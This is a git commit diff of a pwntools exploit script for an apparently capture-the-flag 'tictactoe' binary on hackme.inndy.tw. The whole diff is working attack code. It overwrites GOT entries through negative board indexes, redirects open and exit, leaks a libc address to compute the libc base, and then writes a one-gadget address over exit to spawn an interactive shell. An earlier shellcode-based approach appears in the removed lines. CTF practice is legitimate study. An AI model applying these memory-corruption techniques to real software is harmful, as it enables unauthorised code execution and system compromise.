10c7e0bab934a280d1bcb692d5e2c0cad455f85f
niexinming <993025447@qq.com>
2017-12-12 06:50:52 -0800

    add mytictactoe

--- mytictactoe.py
+++ mytictactoe.py
@@ -3,12 +3,15 @@
 __Auther__ = 'niexinming'
 
 from pwn import *
-import time
+import sys
+from termios import tcflush, TCIFLUSH
+
 context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')
 
-shellcode=""
+localMAGIC = 0x3ac5c      #locallibc
+remoteMAGIC = 0x3ac3e      #remotelibc   #libc6_2.23-0ubuntu3_i386.so
 
-def debug(addr = '0x08048aae'):
+def debug(addr = '0x08048CF2'):
     raw_input('debug:')
     gdb.attach(io, "b *" + addr)
 
@@ -16,7 +19,7 @@ def base_addr(prog_addr,offset):
     return eval(prog_addr)-offset
 
 def input_number(number):
-    io.recvuntil('Input move (9 to change flavor): ')
+    io.recv()
     io.sendline('9')
     #time.sleep(2)
     io.send(number)
@@ -24,12 +27,13 @@ def input_addr(addr):
     io.recvuntil('Input move (9 to change flavor): ')
     io.sendline(addr)
 
+
 elf = ELF('/home/h11p/hackme/tictactoe')
 
 
 io = process('/home/h11p/hackme/tictactoe')
 #io = remote('hackme.inndy.tw', 7714)
-debug()
+#debug()
 io.recvuntil('Play (1)st or (2)nd? ')
 io.sendline('1')
 #change memset to loop
@@ -37,39 +41,68 @@ input_number(p32(0xd5))
 input_addr('-34')
 input_number(p32(0x8b))
 input_addr('-33')
+tcflush(sys.stdin, TCIFLUSH)
 
-#change open to change_code
-input_number(p32(0xab))
+#change open to printf_flag
+input_number(p32(0xb4))
 input_addr('-42')
-input_number(p32(0x86))
+input_number(p32(0x8c))
 input_addr('-41')
 input_number(p32(0x04))
 input_addr('-40')
 input_number(p32(0x08))
 input_addr('-39')
+tcflush(sys.stdin, TCIFLUSH)
 
-#change exit to exec shellcode
-input_number(p32(0x00))
+#change exit to loop
+input_number(p32(0xd5))
 input_addr('-46')
-input_number(p32(0xa0))
+input_number(p32(0x8b))
 input_addr('-45')
 input_number(p32(0x04))
 input_addr('-44')
 input_number(p32(0x08))
 input_addr('-43')
+tcflush(sys.stdin, TCIFLUSH)
 
-
-#change 0x804a000 to shellcode
-input_number(p32(0x90))
-input_addr('-4182')
-
-#get flag
+#success get flag
 input_number(p32(0xff))
 input_addr('-9')
 input_number(p32(0xff))
 input_addr('-8')
 input_number(p32(0xff))
 input_addr('-7')
+tcflush(sys.stdin, TCIFLUSH)
+
+libc_leak=io.recv().splitlines()[1][19:23]
+libc_leak=u32(libc_leak)
+print hex(libc_leak)
+libc_base=libc_leak-0x3f12
+print "libc_base:"+hex(libc_base)
+MAGIC_addr=libc_base+localMAGIC
+print "MAGIC_addr:"+hex(MAGIC_addr)
+
+#unsuccess get flag
+input_number(p32(0x01))
+input_addr('-9')
+tcflush(sys.stdin, TCIFLUSH)
+
+#change exit to MAGIC_addr
+exit_addr=-46
+for i in str(MAGIC_addr):
+    input_number(i)
+    input_addr(str(exit_addr))
+    exit_addr=exit_addr+1
+tcflush(sys.stdin, TCIFLUSH)
+
+#success get flag
+input_number(p32(0xff))
+input_addr('-9')
+input_number(p32(0xff))
+input_addr('-8')
+input_number(p32(0xff))
+input_addr('-7')
+tcflush(sys.stdin, TCIFLUSH)
 
 
 io.interactive()
